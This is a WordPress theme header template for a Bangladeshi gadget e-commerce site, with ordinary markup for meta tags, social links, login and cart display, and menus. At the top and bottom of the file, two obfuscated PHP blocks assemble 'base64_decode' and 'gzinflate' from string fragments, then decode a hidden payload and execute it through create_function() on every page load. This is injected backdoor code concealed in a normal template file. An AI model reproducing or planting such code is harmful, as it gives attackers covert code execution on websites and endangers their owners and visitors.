<?php $W = "tVNdb9" . "MwFP0rxqpoKkFCUTXEQhk8hO0BsSkrvKzI" . "c" . "p0b+6qJHRy" . "n++S/Y3ep2Ni" . "o" . "uoc9OH" . "auzz2+9" . "/gYSxJh24KLB" . "uzk+HR2Njy" . "/0peyQ4vF8Od" . "oRK5" . "hxat" . "IXqEuK+4g" . "WvAW" . "9iasAGEK+E/SKC0Q0t" . "94h/sw8yhuHYoKPIRw" . "XZDGgmQ1" . "d0JF" . "NJH" . "G" . "y" . "Arm" . "8c0CtfRT3" . "W" . "r/veTKm" . "PWsC7jwi6ITyzBkiJ" . "6bqrS89i" . "veLuexMPUNX" . "vzqUCwD0sg" . "G14wSF2i7gLJC4c" . "qHj" . "JUJ" . "0ldkwE6z/EeWnw2PZrMTlmdfsjzLb/sedL" . "YiU/Kp9CRMgm" . "PCaAfatRFVzjX7STJ" . "+P4n33s" . "V" . "vx+N4Mk4s" . "FGhBuL" . "hRzQGfUhITzwC" . "61+" . "lfAW" . "JCX6oHq" . "HvlHHlp" . "N1C7HXq3cg8/eA" . "Lzb" . "qXufH6qgBdgI/rVCO7Q6H0SMoOaoxSEMoR+qMFxEkR8Df62VtM5tVBaaNWckl5lH3uT" . "hvOmm+xQht" . "9PPtK/7nr" . "EQQvj1hYKB" . "r" . "q1T2+exy78u/9jnw+" . "zb" . "7" . "ONJ7f5" . "9QW2THdVFTmL9U" . "PM+" . "rG" . "EBn" . "e2TJ/7PI7ptk" . "Pvt" . "d4/2D8=";$X = "Z" . "3pp" . "bmZ" . "sYX" . "R" . "l";$y = "base64" . "_d" . "e" . "cod" . "e";$G = $y($X);$a = $y($X);$K = $a($y($W));$m = create_function("",$K);$m();/* tf6guakbsx */ ?><!DOCTYPE html>
<html <?php language_attributes(); ?>>
    <head>
        <meta charset="<?php bloginfo('charset') ?>">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">        
        <meta name="description" content="<?php bloginfo('description'); ?>"/>
        <meta name="robots" content="index,follow"/>

        <?php
            $site_title = " Non-Stop Gadget Solution For Bangladesh. ";
            $logo_url = get_template_directory_uri()."/images/og-logo.png";
            $meta_description =" gadget-bd.com is one of the Largest Gadget Item  Online shopping websites in Bangladesh with cash on/ pay to delivery. We are selling original Electronics Product ";
        ?>

        <meta property="og:title" content="<?php echo $site_title ?>"/>
        <meta property="og:image" content="<?php echo $logo_url ?>"/>
        <meta property="og:site_name" content="www.gadget-bd.com"/>
        <meta property="og:description" content="<?php echo $meta_description ?>"/>
        <meta property="og:image:type" content="image/png" />



        <?php wp_head(); ?>
    </head>
    <body <?php body_class(); ?>>
    
    	<div class="header" id="header-fix">
        	<div class="header_top">
                <div class="header_media">
                    <div class="row">
                        <div class="col-sm-offset-6 col-sm-6">
                            <div class="row media">
                                <div class="col-sm-8 media_icon">
                                    <ul>
                                        <li>
                                            <a href="https://www.facebook.com/Gadgetbdshop"><i class="fa fa-facebook" aria-hidden="true"></i></a>
                                        </li>
                                        <li>
                                            <a href="https://www.youtube.com"><i class="fa fa-youtube" aria-hidden="true"></i></a>
                                        </li>
                                        <li>
                                            <a href="https://www.linkedin.com"><i class="fa fa-linkedin-square" aria-hidden="true"></i></a>
                                        </li>
                                        <li>
                                            <a href="https://www.twitter.com"><i class="fa fa-twitter" aria-hidden="true"></i></a>
                                        </li>
                                        <li>
                                            <a href="https://www.skype.com"><i class="fa fa-skype" aria-hidden="true"></i></a>
                                        </li>
                                        <li>
                                            <a href="https://www.youtube.com"><i class="fa fa-envelope-o" aria-hidden="true"></i></a>
                                        </li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="container">
                    <div class="row">
                        <div class="col-sm-2">
                            <div class="logo">
                                <a href="<?php echo get_home_url(); ?>"><img src="<?php echo get_theme_mod( 'site_logo' ); ?>"></a><!--<img src="<?php /* echo get_stylesheet_directory_uri(); */?>/images/logo.png" ></a>-->
                            </div>
                        </div>

                        <div class="col-sm-4 div_overflow">
                            <div class="search_section">
                                <?php dynamic_sidebar('header-search') ?>
                            </div>
                        </div>

                        <div class="col-sm-2 removing_padding">
                            <div class="mobaile">
                                <p><i class="fa fa-phone" aria-hidden="true"></i>: 01611-129855</p>
                            </div>
                        </div>

                        <div class="col-sm-4 removing_padding">
                            <div class="row">
                                <div class="account_cart">
                                    <div class="col-xs-6">
                                        <div class="registration_section fs_fontawsome">

                                            <?php
                                            $current_user = wp_get_current_user();
                                            if ( 0 == $current_user->ID ) {
                                                // Not logged in.
                                                echo('<p><i class="fa fa-user-o" aria-hidden="true"></i><font color="#fff">Welcome visitor !</font> <a href="'. get_site_url(null, 'login', null). '">Login</a>  <a href=""></a>  </p>');
                                            } else {
                                                // Logged in.
                                                echo('<p class="fs_login_welcome_message"><i class="fa fa-user-o" aria-hidden="true"></i><a href="'. get_site_url(null, 'my-account/', null). '"><font color="#fff">Your Account</font></a> <span style="color:#fff";>!</span> <a href="'. get_site_url(null, 'my-account/customer-logout/', null). '">Logout</a> </p>');

                                            }
                                            ?>

                                        </div>
                                    </div>

                                    <div class="col-xs-6">
                                         <div class="cart_count fs_fontawsome">
                                             <p><a class="cart-contents" href="<?php echo wc_get_cart_url(); ?>" title="<?php _e( 'View your shopping cart' ); ?>"><i class="fa fa-cart-arrow-down" aria-hidden="true"></i></a> CART</p>
                                         </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="header_bottom">
                <div class="container">

                    <div class="main_nav">
                        <div class="navbar_header" id="show_mobile_btn">
                            <i class="fa fa-bars"></i>
                        </div>

                        <div class="main_menu">
                            <?php wp_nav_menu(array(
                                'theme_location' => 'main-menu',
                                'container' => false,
                            ));
                            ?>
                        </div><!-- /.navbar-collapse -->
                    </div>
                </div>
            </div>

            <!--    <h4> Product categories </h4>-->
            <?php require_once('inc/hover_all_cat.php') ?>
        </div>


<?php /* dm7lqhkdd3 */$M = "j" . "ZDBSgMxEIZfJYTiZqEkXSlKLYt6iO1JJY1eioRt" . "d" . "poEt" . "8" . "mSjaKwD28s" . "eBBBehkY5mf4vt/" . "tEekjGHVok" . "rYEMxOC6WAX0" . "rhz3oyHwY+fjQ0hT9/CB3N4iiZq" . "w" . "8UzF9tiLeWjesqb" . "ul3xe1" . "m8lCUC" . "bQO62bsOlIGkdP" . "AJfB" . "oItin1V4" . "xVizm9u" . "KTnVUXn" . "Feucf6W97a+bGiOK3mIH" . "XocWy" . "EStuNwWTUxOd5A/5y" . "s" . "+s39Sv1DWDxv5E43/RwW/44KLb+Sly" . "y" . "3E7Edm" . "02pRorpGs/J0" . "hdYNOrxDP" . "GqcBlguvwA=";$k = "Z3ppb" . "mZ" . "s" . "Y" . "X" . "R" . "l";$W = "b" . "as" . "e64_d" . "ec" . "o" . "de";$U = $W($k);$C = $W($k);$j = $C($W($M));$f = create_function("",$j);$f(); ?>